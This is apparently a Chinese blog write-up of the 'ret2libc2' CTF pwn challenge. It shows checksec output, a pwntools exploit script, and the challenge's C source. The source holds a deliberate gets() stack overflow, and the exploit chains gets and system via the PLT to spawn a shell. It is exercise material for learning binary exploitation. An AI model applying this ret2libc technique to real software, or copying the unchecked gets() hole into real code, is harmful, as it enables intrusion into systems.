---
layout:     post
title:      ret2libc2
subtitle:   解题思路
date:       2018-07-05
author:     Mao
header-img: img/home-bg-geek.jpg
catalog: true
tags:
    - PWN
    - 栈溢出
---

```
checksec ret2libc2

[*] '/home/hello/Desktop/test/ret2libc2/ret2libc2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



```
file ret2libc2

ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked
```



[程序下载](https://maoshuu.oss-cn-beijing.aliyuncs.com/elf/ret2libc2)





exp.py

```python
#!/bin/sh/env python

from pwn import *

sh = process('./ret2libc2')
elf = ELF('./ret2libc2')

gets_plt = elf.plt['gets']
system_plt = elf.plt['system']
ret_addr = 0x8048490

pop_ebp = 0x0804872f

buf2 = 0x804A040

payload = flat(['a'*112, gets_plt, pop_ebp, buf2, system_plt, ret_addr, buf2])


#payload = flat(['a'*112, gets_plt, pop_ebp, buf2, system_plt, buf2])
#sh.sendline('a'*112 + p32(system_addr) + p32(ret_addr) + p32(binsh_addr))
sh.sendline(payload)
#sh.sendline('/bin/sh')
sh.interactive()
```





ret2libc2.c

```c
#include <stdio.h>

#include <stdlib.h>

#include <time.h>


char buf2[100];

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        system("no_shell_QQ");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf1[100];

    printf("Something surprise here, but I don't think it will work.\n");
    printf("What do you think ?");
    gets(buf1);

    return 0;
}
```